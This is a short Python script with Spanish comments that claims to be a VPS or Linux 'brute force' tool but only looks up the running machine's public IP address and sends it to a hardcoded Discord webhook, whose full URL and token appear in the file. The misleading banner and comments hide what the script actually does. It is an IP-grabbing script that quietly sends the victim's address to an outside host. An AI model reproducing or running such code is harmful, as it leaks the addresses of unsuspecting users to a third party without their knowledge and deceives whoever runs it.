import requests
import socket

# Configuración del webhook de Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1274590566444695602/WYJZAjWH4gi-D3Prb28OELFS1KtQEjOAi8iOsUfjKRfaAPXRCNsak1_QxfLb9LT3Ck_-"

def get_ip():
    """Obtiene la dirección vps pública del sistema Y brutea las vps."""
    try:
        # Solicita la IP pública a un servicio de IP externa
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json().get('ip')
        return ip
    except Exception as e:
        print(f"Error al obtener la IP: {e}")
        return None

def send_to_webhook(ip):
    """Envía LAS VPS A LA WEBHOOCK."""
    if ip:
        data = {
            "content": f"La dirección VPS es: {ip}"
        }
        try:
            response = requests.post(WEBHOOK_URL, json=data)
            if response.status_code == 204:
                print("¡La IP se ha enviado correctamente al webhook!")
            else:
                print(f"Error al enviar la IP al webhook: {response.status_code}")
        except Exception as e:
            print(f"Error al enviar la IP al webhook: {e}")

def main():
    print("! INFO ! Bruteando Linux Scripting! ! INFO !")
    
    # Bruetea la VPS y envíala al webhook
    ip = get_ip()
    send_to_webhook(ip)

if __name__ == "__main__":
    main()
